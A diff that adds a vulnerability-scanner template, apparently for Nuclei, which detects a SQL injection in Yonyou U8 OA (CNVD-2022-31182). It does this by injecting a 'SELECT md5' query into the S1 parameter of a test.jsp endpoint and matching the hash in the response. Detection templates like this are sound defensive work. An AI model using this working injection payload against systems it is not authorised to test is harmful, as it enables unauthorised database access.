@@ -1,0 +1,28 @@
+id: CNVD-2022-31182
+info:
+  name: Yonyou U8 OA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL Injection vulnerability in Yonyou U8 OA detected via MD5 hash comparison.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-31182
+
+variables:
+  rand: "{{rand_int(200000000, 220000000)}}"
+
+http:
+  - raw:
+      - |
+        GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}})) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
